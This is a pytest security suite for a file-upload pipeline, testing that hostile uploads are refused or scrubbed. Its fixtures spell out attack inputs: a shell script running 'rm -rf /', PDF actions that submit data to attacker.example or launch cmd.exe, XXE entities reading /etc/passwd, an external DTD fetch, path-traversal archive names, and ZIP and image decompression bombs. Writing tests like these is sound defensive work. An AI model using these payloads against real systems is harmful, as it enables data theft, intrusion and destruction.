"""File handling — hostile uploads, archives, XML and download links.

    pytest tests/security/test_upload_attacks.py -q

The validation pipeline (magic-byte sniffing, declared-versus-actual type,
page and pixel ceilings, archive limits, a hardened XML parser) already has
unit tests for its happy paths and a few refusals. These add the attacks a
hostile tenant user would try, at the seam each one meets:

* a file that lies about its type (HTML, a Windows executable, a ZIP called
  .pdf, a script hidden in a GIF comment);
* PDFs with active content, encryption, a corrupt body;
* an image that declares a billion pixels in a few hundred bytes;
* ZIP archives: a compression bomb, a flood of tiny entries, path traversal
  names, nested archives, executables inside;
* XML external entities and entity-expansion bombs;
* a filename such as ../../etc/passwd through the real upload endpoint;
* how long a presigned download link lives.
"""

from __future__ import annotations

import io
import struct
import zipfile
import zlib
from pathlib import Path

import pytest
from pypdf import PdfWriter
from pypdf.generic import ArrayObject, DictionaryObject, NameObject, NumberObject, TextStringObject

from app.services import file_validation_service as fv
from app.services.ingestion import archive

ALLOWED = ["application/pdf", "image/png", "image/jpeg", "image/gif"]


def _validate(data: bytes, *, declared: str = "application/pdf", name: str = "doc.pdf", max_pages: int = 50):
    return fv.validate_spooled(
        io.BytesIO(data), len(data), declared_mime=declared, original_filename=name,
        allowed_mimes=ALLOWED, max_pages=max_pages,
    )


def _refusal(data: bytes, **kwargs) -> fv.FileValidationError:
    with pytest.raises(fv.FileValidationError) as failure:
        _validate(data, **kwargs)
    return failure.value


def _pdf(pages: int = 1, *, configure=None) -> bytes:
    writer = PdfWriter()
    for _ in range(pages):
        writer.add_blank_page(72, 72)
    if configure:
        configure(writer)
    buffer = io.BytesIO()
    writer.write(buffer)
    return buffer.getvalue()


# ---------------------------------------------------------------------------
# A file that lies about what it is
# ---------------------------------------------------------------------------

HTML = b"<html><body><script>fetch('/api/v1/me/profile')</script></body></html>"
EXE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 200
SHELL = b"#!/bin/sh\nrm -rf /\n"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


@pytest.mark.parametrize("payload", [HTML, EXE, SHELL, SVG, b"", b"\x00" * 64, b"%PD"])
def test_a_file_that_is_not_a_pdf_is_refused_however_it_is_named_and_declared(payload: bytes) -> None:
    error = _refusal(payload, declared="application/pdf", name="invoice.pdf")
    assert error.reason in {fv.RejectionReason.UNKNOWN_SIGNATURE, fv.RejectionReason.EMPTY, fv.RejectionReason.CORRUPT}


def test_a_zip_called_a_pdf_is_a_type_mismatch() -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive_file:
        archive_file.writestr("evil.exe", b"MZ")
    error = _refusal(buffer.getvalue(), declared="application/pdf")
    assert error.reason in {fv.RejectionReason.MIME_MISMATCH, fv.RejectionReason.MIME_NOT_ALLOWED}


def test_a_pdf_declared_as_a_png_is_a_mismatch_and_is_quarantined() -> None:
    error = _refusal(_pdf(), declared="image/png", name="scan.png")
    assert error.reason == fv.RejectionReason.MIME_MISMATCH and error.should_quarantine


def test_a_script_hidden_in_a_gif_comment_does_not_survive_the_re_encode() -> None:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new("P", (8, 8)).save(buffer, format="GIF", comment=b"<script>alert(1)</script>")
    upload = _validate(buffer.getvalue(), declared="image/gif", name="pic.gif")
    assert b"<script>" not in upload.handle.read()
    upload.close()


def test_an_octet_stream_declaration_cannot_smuggle_a_disallowed_type() -> None:
    error = _refusal(EXE, declared="application/octet-stream", name="setup.pdf")
    assert error.reason == fv.RejectionReason.UNKNOWN_SIGNATURE


# ---------------------------------------------------------------------------
# PDFs
# ---------------------------------------------------------------------------


def test_an_encrypted_pdf_is_refused() -> None:
    def encrypt(writer: PdfWriter) -> None:
        writer.encrypt("hunter2")

    assert _refusal(_pdf(configure=encrypt)).reason == fv.RejectionReason.ENCRYPTED


def test_a_truncated_pdf_is_corrupt_not_a_500() -> None:
    assert _refusal(_pdf(3)[:200]).reason == fv.RejectionReason.CORRUPT


def test_a_pdf_page_bomb_is_refused_before_processing() -> None:
    assert _refusal(_pdf(60), max_pages=50).reason == fv.RejectionReason.TOO_MANY_PAGES


#: What a PDF viewer would run or fetch when the document is opened.
DANGEROUS = (b"/JavaScript", b"/JS", b"/OpenAction", b"/Launch", b"/AA", b"/SubmitForm", b"/ImportData", b"/EmbeddedFile")


def _survivors(output: bytes) -> list[bytes]:
    return [marker for marker in DANGEROUS if marker in output]


def test_document_level_active_content_is_not_carried_into_the_stored_file() -> None:
    def add(writer: PdfWriter) -> None:
        writer.add_js("app.alert('owned');")
        writer._root_object[NameObject("/OpenAction")] = DictionaryObject(
            {NameObject("/S"): NameObject("/JavaScript"), NameObject("/JS"): TextStringObject("app.alert(1)")}
        )

    original = _pdf(configure=add)
    assert _survivors(original), "the fixture must actually contain active content"
    upload = _validate(original)
    assert "active_content" in " ".join(upload.notes)
    assert _survivors(upload.handle.read()) == []
    upload.close()


def _page_with_action(writer: PdfWriter, action: dict) -> None:
    page = writer.pages[0]
    annotation = DictionaryObject(
        {
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Link"),
            NameObject("/Rect"): ArrayObject([NumberObject(0), NumberObject(0), NumberObject(72), NumberObject(72)]),
            NameObject("/A"): DictionaryObject({NameObject(k): v for k, v in action.items()}),
        }
    )
    page[NameObject("/Annots")] = ArrayObject([writer._add_object(annotation)])
    page[NameObject("/AA")] = DictionaryObject(
        {
            NameObject("/O"): DictionaryObject(
                {NameObject("/S"): NameObject("/JavaScript"), NameObject("/JS"): TextStringObject("app.alert(2)")}
            )
        }
    )


@pytest.mark.parametrize(
    "action",
    [
        {"/S": NameObject("/JavaScript"), "/JS": TextStringObject("this.exportDataObject({cName:'x',nLaunch:2})")},
        {"/S": NameObject("/Launch"), "/F": TextStringObject("cmd.exe")},
        {"/S": NameObject("/SubmitForm"), "/F": TextStringObject("https://attacker.example/steal")},
        {"/S": NameObject("/ImportData"), "/F": TextStringObject("https://attacker.example/x")},
    ],
    ids=["javascript", "launch", "submit-form", "import-data"],
)
def test_page_level_actions_are_not_carried_into_the_stored_file(action: dict) -> None:
    """The scrub rebuilds the document from its pages. A page keeps its own
    annotations and additional-actions dictionary, so an action attached to a
    link or to the page itself has to be removed as well."""
    original = _pdf(configure=lambda w: _page_with_action(w, action))
    assert _survivors(original), "the fixture must actually contain active content"
    upload = _validate(original)
    assert _survivors(upload.handle.read()) == []
    upload.close()


def test_a_clean_pdf_still_round_trips_with_its_pages() -> None:
    """Control: the scrub does not destroy an ordinary document."""
    upload = _validate(_pdf(3))
    assert upload.page_count == 3 and upload.mime_type == "application/pdf"
    assert upload.handle.read(5) == b"%PDF-"
    upload.close()


# ---------------------------------------------------------------------------
# Images
# ---------------------------------------------------------------------------


def _png_declaring(width: int, height: int) -> bytes:
    """A valid PNG whose header claims a huge canvas but whose data is tiny."""

    def chunk(kind: bytes, data: bytes) -> bytes:
        body = kind + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

    header = struct.pack(">IIBBBBB", width, height, 8, 0, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", zlib.compress(b"\x00")) + chunk(b"IEND", b"")


def test_an_image_that_declares_a_billion_pixels_is_refused_not_decoded() -> None:
    error = _refusal(_png_declaring(40_000, 40_000), declared="image/png", name="bomb.png")
    assert error.reason in {fv.RejectionReason.DECOMPRESSION_BOMB, fv.RejectionReason.CORRUPT}


# ---------------------------------------------------------------------------
# Archives
# ---------------------------------------------------------------------------


def _zip(entries: dict[str, bytes], *, compression=zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=compression) as z:
        for name, data in entries.items():
            z.writestr(name, data)
    return buffer.getvalue()


def _rejected(data: bytes) -> archive.ArchiveRejected:
    with pytest.raises(archive.ArchiveRejected) as failure:
        list(archive.expand(data))
    return failure.value


def test_a_compression_bomb_is_refused_from_the_directory_alone() -> None:
    bomb = _zip({"scan.pdf": b"\x00" * (300 * 1024 * 1024)})
    assert len(bomb) < 2 * 1024 * 1024, "a few hundred KB that inflate to 300 MB"
    _rejected(bomb)


def test_many_moderate_ratio_entries_are_refused_in_aggregate() -> None:
    entries = {f"p{n}.pdf": b"A" * 1_000_000 for n in range(30)}
    bomb = _zip(entries)
    assert len(bomb) * 100 < sum(map(len, entries.values()))
    _rejected(bomb)


def test_a_flood_of_tiny_entries_is_refused() -> None:
    _rejected(_zip({f"{n}.png": b"x" for n in range(archive.MAX_ENTRIES + 5)}, compression=zipfile.ZIP_STORED))


@pytest.mark.parametrize(
    "name",
    ["../../etc/cron.d/x.pdf", "/etc/passwd.pdf", "..\\..\\windows\\system32\\x.pdf", "a/../../b.pdf", "C:\\x.pdf", "ok/\x00../x.pdf"],
)
def test_a_traversing_entry_name_never_becomes_a_member(name: str) -> None:
    data = _zip({name: b"%PDF-1.4 x", "fine.pdf": b"%PDF-1.4 y"})
    try:
        members = list(archive.expand(data))
    except archive.ArchiveRejected:
        return
    for member in members:
        assert ".." not in member.name and not member.name.startswith(("/", "\\")) and ":" not in member.name, member.name
        assert "\x00" not in member.name


def test_an_archive_inside_an_archive_is_refused() -> None:
    inner = _zip({"x.pdf": b"%PDF-1.4 x"})
    outer = _zip({"inner.zip": inner})
    try:
        members = list(archive.expand(outer))
    except archive.ArchiveRejected:
        return
    assert all(not member.name.lower().endswith(".zip") for member in members)


@pytest.mark.parametrize("member", ["run.exe", "page.html", "logo.svg", "macro.docm", "x.php", "x.pdf.exe"])
def test_executables_and_active_documents_inside_an_archive_are_not_members(member: str) -> None:
    data = _zip({member: b"MZ", "good.pdf": b"%PDF-1.4 ok"})
    try:
        names = [m.name for m in archive.expand(data)]
    except archive.ArchiveRejected:
        return
    assert member not in names


def test_a_file_that_is_not_a_zip_but_claims_to_be_is_refused() -> None:
    _rejected(b"PK\x03\x04" + b"\x00" * 30)
    _rejected(b"this is not an archive at all")


def test_an_ordinary_archive_still_expands() -> None:
    """Control: the limits refuse bombs, not archives."""
    members = list(archive.expand(_zip({"a.pdf": b"%PDF-1.4 a", "b.png": b"\x89PNG\r\n\x1a\n" + b"x" * 40})))
    assert sorted(m.name for m in members) == ["a.pdf", "b.png"]


# ---------------------------------------------------------------------------
# XML
# ---------------------------------------------------------------------------

from app.services.erp.formats import xmlsafe  # noqa: E402

XXE = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
LAUGHS = (
    b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><l>&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;</l>'
)
PARAMETER = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/x.dtd">%p;]><r/>'


@pytest.mark.parametrize("payload", [XXE, LAUGHS, PARAMETER, XXE.replace(b"DOCTYPE", b"doctype"), XXE.replace(b"<!ENTITY", b"<!  ENTITY")])
def test_xml_with_a_doctype_or_entity_is_refused(payload: bytes) -> None:
    with pytest.raises(xmlsafe.XMLRefused):
        xmlsafe.parse(payload)


def test_a_utf16_encoded_doctype_does_not_bypass_the_check() -> None:
    with pytest.raises(xmlsafe.XMLRefused):
        xmlsafe.parse(XXE.decode().encode("utf-16"))


def test_xinclude_is_not_processed() -> None:
    document = b'<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>'
    root = xmlsafe.parse(document)
    assert b"root:" not in xmlsafe.tostring(root)


def test_oversized_xml_is_refused() -> None:
    with pytest.raises(xmlsafe.XMLRefused):
        xmlsafe.parse(b"<r>" + b"a" * (xmlsafe.MAX_BYTES + 1) + b"</r>")


def test_ordinary_xml_still_parses() -> None:
    assert xmlsafe.parse(b"<r><i>1</i></r>").tag == "r"


# ---------------------------------------------------------------------------
# Presigned links
# ---------------------------------------------------------------------------


def test_presigned_download_links_live_at_most_fifteen_minutes(monkeypatch: pytest.MonkeyPatch) -> None:
    from urllib.parse import parse_qs, urlparse

    from app.core.config import settings
    from app.core.storage.s3 import MinIOStorageDriver
    from app.services.compliance import export_service
    from app.services.redaction import redaction_service

    assert export_service.DOWNLOAD_URL_TTL_SECONDS <= 900
    import inspect

    assert inspect.signature(redaction_service.bundle_urls).parameters["expires_in"].default <= 900

    monkeypatch.setattr(settings, "S3_ACCESS_KEY_ID", "AKIAEXAMPLEEXAMPLE1")
    monkeypatch.setattr(settings, "S3_SECRET_ACCESS_KEY", __import__("pydantic").SecretStr("secretsecretsecretsecretsecret12"))
    driver = MinIOStorageDriver(
        bucket="flowpilot-test", region="us-east-1", endpoint_url="http://minio.internal:9000", prefix="",
        max_pool_connections=2, multipart_threshold=8 * 1024 * 1024, multipart_chunksize=8 * 1024 * 1024, max_concurrency=1,
    )
    url = driver.presigned_get_url("org/abc/file.pdf", expires_in=export_service.DOWNLOAD_URL_TTL_SECONDS)
    query = parse_qs(urlparse(url).query)
    assert int(query["X-Amz-Expires"][0]) <= 900
    assert urlparse(url).path.endswith("/org/abc/file.pdf")
